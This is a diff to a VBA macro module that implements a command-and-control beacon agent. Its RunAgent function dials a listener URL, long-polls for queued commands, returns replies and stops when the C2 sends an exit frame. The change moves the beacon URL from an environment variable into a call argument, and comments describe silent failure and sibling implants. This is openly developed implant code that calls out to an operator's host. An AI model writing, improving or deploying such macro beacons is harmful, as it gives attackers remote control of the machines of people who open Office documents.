@@ -15,9 +15,12 @@ Option Explicit
 '   a held 25-35 s answer with the queued command frames out.
 '
 ' The module defines exactly ONE public symbol, RunAgent(); everything else
-' is Private. It carries NO baked configuration: the single input is the
-' process environment variable H_URL, which the host master sets before
-' calling RunAgent.
+' is Private. It carries NO baked configuration: the beacon URL arrives as
+' RunAgent's Optional argument -- the host master's one call -- with the
+' H_URL environment variable inherited at host start as the fallback. (VBA
+' Environ reads the environment block as it existed when the runtime
+' initialized, so a var written at RUN time is invisible to it -- the URL
+' must ride the call, not a run-time env write.)
 '
 ' The beacon transport is ASYNC with a DoEvents pump (BeaconCycle): the
 ' long-poll hold IS the agent's only idle sleep, and blocking the host's
@@ -43,7 +46,7 @@ Private Declare Sub Sleep Lib "kernel32" (ByVal ms As Long)
 #End If
 
 ' -- module state -------------------------------------------------------------
-Private mBeaconUrl As String       ' H_URL -- the bare listener origin
+Private mBeaconUrl As String       ' the beacon URL -- call arg, else inherited H_URL
 Private mHdrNames() As String      ' identity headers, name/value pairs
 Private mHdrValues() As String
 Private mHdrCount As Long
@@ -54,12 +57,17 @@ Private mLogShips As Collection    ' in-flight async log ships, retained until r
 Private mReplies As Collection     ' reply frames owed since the last POST
 
 ' ============================================================================
-' RunAgent -- the one public symbol. The host master sets H_URL in the
-' process environment, then calls this.
+' RunAgent -- the one public symbol. The host master passes the beacon URL
+' straight into the call:
 '
-'   set H_URL=http://host:port
 '   ... CreateObject / dot sourcing the module ...
-'   result = RunAgent()
+'   result = RunAgent("http://host:port")
+'
+' An omitted/empty argument falls back to the H_URL environment variable --
+' usable when the var was inherited at host start (set H_URL=http://host:port
+' before launching the Office binary). A var written at RUN time (the
+' master writing it through WScript.Shell in this same process) never shows
+' up in Environ -- hence the argument.
 '
 ' Returns one of:
 '   "exit" -- the C2 sent 0x0A; the run ended cleanly (no reply is sent for
@@ -71,7 +79,7 @@ Private mReplies As Collection     ' reply frames owed since the last POST
 '             DoEvents pump makes re-entry reachable: a host firing another
 '             macro lands here instead of a second beacon loop).
 ' ============================================================================
-Public Function RunAgent() As String
+Public Function RunAgent(Optional ByVal beaconUrl As String = "") As String
     If mRunning Then RunAgent = "busy": Exit Function
     mRunning = True
     On Error GoTo fail
@@ -80,9 +88,11 @@ Public Function RunAgent() As String
     Set mLogShips = New Collection
     Set mReplies = New Collection
 
-    ' No H_URL -> nothing to dial. The log is inert before identity exists,
-    ' so this fails SILENTLY -- exactly how the siblings behave.
-    mBeaconUrl = Environ$("H_URL")
+    ' The master's argument first, the inherited H_URL env var second. With
+    ' neither there is nothing to dial. The log is inert before identity
+    ' exists, so this fails SILENTLY -- exactly how the siblings behave.
+    mBeaconUrl = beaconUrl
+    If Len(mBeaconUrl) = 0 Then mBeaconUrl = Environ$("H_URL")
     If Len(mBeaconUrl) = 0 Then
         RunAgent = "fail"
         GoTo done
